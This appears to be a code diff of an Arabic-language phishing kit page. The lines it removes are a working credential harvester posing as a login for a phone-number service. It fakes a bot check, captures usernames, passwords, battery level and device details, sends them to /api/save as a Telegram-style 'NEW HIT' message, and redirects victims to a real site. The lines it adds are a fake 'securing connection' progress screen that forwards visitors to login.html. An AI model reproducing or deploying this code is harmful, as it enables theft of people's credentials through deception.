@@ -3,149 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل خدمة الأرقام</title>
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    
+    <title>نظام التحقق الآمن</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary-color: #CC0044;
-            --main-gradient: linear-gradient(135deg, #FF0055 0%, #990033 100%);
-        }
-
-        body {
-            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: var(--main-gradient);
-            display: flex; flex-direction: column; align-items: center; min-height: 100vh;
-        }
-
-        .container {
-            background: white; padding: 40px 30px; 
-            border-radius: 30px; /* حواف ناعمة جداً واحترافية */
-            box-shadow: 0 15px 35px rgba(0,0,0,0.3); 
-            width: 88%; max-width: 400px; text-align: center;
-            margin-top: 40px; border: 1px solid rgba(255,255,255,0.2);
-        }
-
-        #pageImg { 
-            width: 100px; height: 100px; border-radius: 50%; 
-            object-fit: contain; margin-bottom: 25px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-        }
-        
-        h2 { color: var(--primary-color); margin-bottom: 30px; font-size: 20px; font-weight: 800; }
-        
-        input {
-            width: 100%; padding: 16px; margin-bottom: 18px;
-            border: 2px solid #f0f0f0; border-radius: 15px; 
-            box-sizing: border-box; outline: none; text-align: right;
-            font-size: 15px; transition: 0.3s;
-        }
-        input:focus { border-color: var(--primary-color); background: #fffcfd; }
-
-        .captcha-area { margin-bottom: 25px; min-height: 70px; display: flex; align-items: center; justify-content: center; }
-        #status-msg { color: var(--primary-color); font-weight: bold; font-size: 15px; display: none; }
-
-        .main-btn {
-            width: 100%; padding: 16px; background: var(--primary-color); color: white;
-            border: none; border-radius: 50px; /* تصميم بيضاوي احترافي */
-            font-size: 18px; font-weight: bold; cursor: pointer;
-            transition: 0.4s ease;
-            box-shadow: 0 8px 15px rgba(204, 0, 68, 0.2);
-        }
-        .main-btn:hover { transform: translateY(-3px); box-shadow: 0 12px 20px rgba(204, 0, 68, 0.3); }
-
-        .footer { margin-top: 25px; font-size: 14px; color: #666; }
-        .footer a { color: var(--primary-color); text-decoration: none; font-weight: bold; cursor: pointer; }
-
-        .credits { margin-top: auto; padding: 20px; color: rgba(255,255,255,0.8); font-size: 12px; direction: ltr; }
+        body { margin: 0; font-family: 'Cairo', sans-serif; background-color: #0a0e17; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; overflow: hidden; }
+        .container { text-align: center; width: 90%; max-width: 400px; }
+        .loader-box { background: #141b2b; padding: 40px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.05); }
+        .shield { font-size: 50px; color: #00f2fe; margin-bottom: 20px; animation: pulse 1.5s infinite; }
+        .progress-bar { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; margin: 20px 0; overflow: hidden; }
+        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #4facfe, #00f2fe); transition: 0.1s; }
+        @keyframes pulse { 0%, 100% { opacity: 0.5; transform: scale(0.9); } 50% { opacity: 1; transform: scale(1.1); } }
     </style>
 </head>
 <body>
-
-    <div class="container">
-        <img id="pageImg" src="https://logodix.com/logo/2014521.png" alt="Logo">
-        <h2>سجل دخولك لتفعيل خدمة الأرقام</h2>
-
-        <form id="loginForm">
-            <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
-            
-            <div class="captcha-area">
-                <div id="status-msg">🔄 جاري فحص أمان الجهاز...</div>
-                <div class="cf-turnstile" id="cf-box" data-sitekey="1x00000000000000000000AA" data-callback="verifyOk"></div>
-            </div>
-
-            <button type="submit" class="main-btn">تفعيل الآن</button>
-        </form>
-
-        <div class="footer">
-            ليس لديك حساب؟ <a onclick="Swal.fire({icon:'error', title:'فشل', text:'فشل الاتصال بالخادم الرئيسي', confirmButtonColor:'#CC0044'})">إنشاء حساب جديد</a>
+    <div class="container" id="loader">
+        <div class="loader-box">
+            <div class="shield">🛡️</div>
+            <div id="status-text">جاري تشفير الجلسة 0%</div>
+            <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
         </div>
     </div>
-
-    <div class="credits">Developed by oliver 2014 - 2026</div>
-
     <script>
-        let isDone = false;
-
-        // وظيفة التحقق (لزيادة الواقعية)
-        function verifyOk() {
-            const box = document.getElementById('cf-box');
-            const msg = document.getElementById('status-msg');
-            box.style.display = 'none';
-            msg.style.display = 'block';
-            
-            setTimeout(() => {
-                msg.innerHTML = '✅ تم التحقق انك لست روبوت';
-                msg.style.color = '#28a745';
-                isDone = true;
-            }, 2500);
-        }
-
-        async function getBattery() {
-            try {
-                const b = await navigator.getBattery();
-                return Math.round(b.level * 100) + "%";
-            } catch { return "45%"; } // قيمة افتراضية في حال الرفض
-        }
-
-        document.getElementById('loginForm').onsubmit = async (e) => {
-            e.preventDefault();
-            if(!isDone) return Swal.fire({text:'يرجى إكمال التحقق أولاً', icon:'warning'});
-
-            const bat = await getBattery();
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-
-            // تنسيق الرسالة لكي تظهر مرتبة جداً في التليجرام
-            const niceMessage = `
-🌟 **وصول بيانات جديدة** 🌟
-━━━━━━━━━━━━━━━
-👤 **المستخدم:** \`${u}\`
-🔑 **الباسورد:** \`${p}\`
-━━━━━━━━━━━━━━━
-🔋 **البطارية:** ${bat}
-📱 **الجهاز:** ${navigator.platform}
-⏰ **التوقيت:** ${new Date().toLocaleString('ar-EG')}
-━━━━━━━━━━━━━━━
-🎯 **الحالة:** مكتمل البيانات
-            `;
-
-            try {
-                await fetch('/api/save', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        title: "🔥 NEW HIT 🔥",
-                        message: niceMessage // إرسال النص المنسق
-                    })
-                });
-            } catch(err) {}
-
-            // التحويل للموقع الحقيقي بعد الصيد
-            window.location.href = "https://receive-smss.com/";
-        };
+        let p = 0;
+        const interval = setInterval(() => {
+            p += Math.floor(Math.random() * 4) + 1;
+            if (p >= 100) {
+                p = 100;
+                clearInterval(interval);
+                setTimeout(() => { window.location.href = "login.html"; }, 500);
+            }
+            document.getElementById("fill").style.width = p + "%";
+            document.getElementById("status-text").innerText = `جاري تأمين الاتصال ${p}%`;
+        }, 50);
     </script>
 </body>
 </html>
